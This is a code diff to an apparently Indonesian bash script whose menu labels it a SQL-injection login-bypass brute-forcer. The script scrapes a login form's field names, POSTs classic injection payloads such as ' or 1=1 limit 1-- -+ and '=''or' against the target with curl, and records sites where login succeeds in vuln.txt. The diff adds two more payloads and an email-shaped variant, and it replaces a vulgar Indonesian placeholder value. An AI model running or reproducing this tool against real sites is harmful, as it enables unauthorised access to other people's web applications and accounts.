@@ -20,9 +20,11 @@ export LANG=en_AU.UTF-8
 #//                 NGA USAH BUAT PENCITRAAN                            //
 #/////////////////////////////////////////////////////////////////////////
 #bypass sql login
-xpl="kontol"
+xpl="test" #jgn di ubah!!! 
 xpl1="' or 1=1 limit 1-- -+"
 xpl2="'=''or'"
+xpl3="admin"
+xpl4="'=''or'@gmail.com"
 list_xploit="xploit.txt"
 list_direct="redirectdir.txt"
 #boot sqli
@@ -649,19 +651,27 @@ fi
 param=$(echo $ng | grep -Po '(<input).*?(>)' | grep -Po 'name="[^"]*' | cut -d '"' -f2 | head -2 | awk '!a[$0]++' | sed -n -e 'H;${x;s/\n/,/g;s/^,//;p;}')
 param1=$(echo ${param} | awk -F "," '{print $1}')
 param2=$(echo ${param} | awk -F "," '{print $2}')
-postdata="$param1=$xploit&$param2=$xploit$value"
+if echo "$xploit" | grep -Po "@gmail" >/dev/null;then
+   postdata="$param1=$xploit&$param2='=''or'@gmail.com$value"
+else
+   postdata="$param1=$xploit&$param2=$xploit$value"
+fi
 cek=$(curl -s -L -X POST "${post}" -d "${postdata}")
 if echo "$cek" | grep -Po "User|user|password|Password|Username|username|email|Email|salah|Salah|Gagal|coba|gagal|wrong|Wrong|Invalid|IncorectError|405|error" >/dev/null
  then
    echo -e "${R}Gagal login dengan  : ${O}$xploit"
    echo -e "${P}Post data: $post -d "$postdata"${N}\n"
  else
+   if [[ "$xploit" = "kontol" ]];then
+       echo -e "${P}Failed get login${N}"
+       break
+   fi
    sukses="\n+++++++++++++++++++++!!![ login sukses ]!!!+++++++++++++++++++++\nSite: $target \nLogin: $xploit"
    echo -e "$sukses\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" >> vuln.txt 
    echo -e "\a${N}[${G}INFO${N}] ${N}Login suksess\n${O}site : ${N}${P}$target\n${O}Login: ${BL}$xploit\n${N}${P}Saved: vuln-bypass.txt\n${R}${P}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++${N}"
     break
 fi
-done < <(echo -e "$xpl\n$xpl1\n$xpl2\n$(cat $list_xploit 2>/dev/null)")
+done < <(echo -e "$xpl\n$xpl1\n$xpl2\n$xpl3\n$xpl4\n$(cat $list_xploit 2>/dev/null)")
 if [[ "$sukses" = "" ]];then
    param=$(echo $ng | grep -Po '(<input).*?(>)' | grep -Po 'name="[^"]*' | cut -d '"' -f2 | awk '!a[$0]++')
    echo -e "${N}Auto xploit gagal coba semi manual"
@@ -744,7 +754,6 @@ ${G}__██____██___
 "
 }
 menu() {
-  clear
 banner
 echo -e "\033[1m$N[$R+$N] \e[38;5;81m${O}PSQLI MENU\e[0m
 [${O}1${N}]. Bypass login bruteforce
